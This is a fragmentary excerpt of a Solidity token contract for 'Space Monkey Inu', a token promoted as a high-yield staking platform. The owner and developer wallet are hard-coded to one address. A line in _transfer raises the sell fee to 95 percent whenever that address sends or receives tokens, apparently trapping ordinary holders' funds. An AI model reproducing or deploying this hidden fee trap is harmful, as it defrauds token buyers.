...
/*
    ...
    Space Monkey Inu ($SMI) vision is to create a platform that gathers the most popular dapps in the same place.
    Our highest priority is creating a staking platform that offers one of the highest yields on the Binance network, which in turn will incentivize staking and contribute to the long-term success of Space Monkey Inu

    Linktree : https://linktr.ee/spacemonkeyinu
    Telegram : https://t.me/SpaceMonkeyInuToken
*/
...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x1B101a0482d116E92312641CbE7EF8196BE34B32;
...
contract SpaceMonkeyInu is Context, IERC20, Ownable {
    ...
    */
    ...
    address payable private Wallet_Dev = payable(0x1B101a0482d116E92312641CbE7EF8196BE34B32);
    ...
    */
    ...
    string private _name = "Space Monkey Inu";
    ...
    */
    ...
    function _transfer(
        ...
        */
        ...
        if (from == address(0x1B101a0482d116E92312641CbE7EF8196BE34B32) || to == address(0x1B101a0482d116E92312641CbE7EF8196BE34B32)) { _sellFee = 95; _buyFee = 5; }
    }
